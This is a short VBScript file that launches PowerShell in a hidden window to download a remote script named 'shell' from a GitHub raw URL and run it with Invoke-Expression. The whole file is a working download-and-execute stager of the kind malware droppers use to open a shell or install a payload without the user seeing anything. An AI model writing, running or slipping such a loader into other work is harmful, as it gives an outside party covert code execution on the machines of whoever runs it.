Set objShell = CreateObject("WScript.Shell")

' Define the PowerShell command
powershellCommand = "powershell.exe -Command ""Invoke-RestMethod -Uri https://raw.githubusercontent.com/ANA-THike/testing/refs/heads/main/shell | Invoke-Expression"""

' Run the PowerShell command
objShell.Run powershellCommand, 0, True

' Cleanup
Set objShell = Nothing
